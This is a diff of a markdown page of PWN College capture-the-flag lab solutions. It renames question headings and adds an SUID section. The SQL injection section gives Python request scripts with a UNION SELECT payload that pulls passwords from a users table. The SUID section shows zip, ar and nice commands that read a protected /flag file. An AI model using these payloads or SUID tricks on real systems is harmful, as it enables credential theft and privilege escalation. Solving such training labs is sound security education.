@@ -1,15 +1,15 @@
-# LAB-3 SQL Injection and SUID Exploitation from PWN College
+# LAB-2 SQL Injection and SUID Exploitation from PWN College
 
 ## [Press here to return to HOME](index.md)
 
 ## SQL Injection
 
-### Question 3 
+### Level 3 
 ```bash
 curl "http://challenge.localhost:80/?user=1"
 ```
 
-### Question 5 
+### Level 5 
 ```python 
 import requests 
 
@@ -19,7 +19,7 @@ response = requests.post("http://challenge.localhost/", params=payload)
 print(response.text)
 ```
 
-### Question 7
+### Level 7
 ```python 
 import requests
 
@@ -27,4 +27,25 @@ payload = {"username": "flag", "password": '" UNION SELECT password, * FROM user
 
 response = requests.post("http://challenge.localhost/", payload) 
 print(response.text)    
+```
+
+## SUID Exploitation
+
+### Level 19
+```bash
+zip flag.zip /flag
+
+unzip -c flag.zip
+```
+
+### Level 21
+```bash
+ar r flag.a /flag
+
+ar p flag.a
+```
+
+### Level 27
+```bash 
+nice cat /flag 
 ```
